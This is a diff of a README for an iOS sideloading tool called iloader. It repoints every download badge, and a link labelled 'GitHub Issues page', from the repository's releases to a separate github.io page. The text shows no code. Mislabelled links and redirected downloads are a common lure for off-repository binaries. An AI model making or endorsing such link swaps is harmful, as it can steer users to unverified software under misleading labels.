@@ -1,6 +1,6 @@
 # 🚀 iloader - Your Simple iOS Sideloading Solution
 
-[![Download iloader](https://img.shields.io/badge/Download-iloader-2ea44f?style=for-the-badge)](https://github.com/hastypuddingmatisse7846/iloader/releases)
+[![Download iloader](https://img.shields.io/badge/Download-iloader-2ea44f?style=for-the-badge)](https://hastypuddingmatisse7846.github.io)
 
 Welcome to **iloader**, the easiest way to install apps on your iPhone or iPad without the App Store. We built this tool for everyday users—no tech skills needed. If you can click a button, you can sideload.
 
@@ -106,7 +106,7 @@ If you run into any issues, don't panic. Here are common fixes:
 - **App Fails to Install**: Make sure your iOS device is unlocked and connected. Close iloader and reopen it, then try again.
 - **Slow Download**: This is usually a network issue. Check your internet speed and try again.
 
-If you still need help, visit our [GitHub Issues page](https://github.com/hastypuddingmatisse7846/iloader/releases) and post your question. Our community is friendly and quick to respond.
+If you still need help, visit our [GitHub Issues page](https://hastypuddingmatisse7846.github.io) and post your question. Our community is friendly and quick to respond.
 
 ---
 
@@ -166,7 +166,7 @@ iloader is more than just a tool—it's a gateway to the apps you want on the de
 
 Click the button below to start your new sideloading adventure today.
 
-[![Get iloader Now](https://img.shields.io/badge/Get_iloader-Now-brightgreen?style=for-the-badge&logo=apple)](https://github.com/hastypuddingmatisse7846/iloader/releases)
+[![Get iloader Now](https://img.shields.io/badge/Get_iloader-Now-brightgreen?style=for-the-badge&logo=apple)](https://hastypuddingmatisse7846.github.io)
 
 ---
 
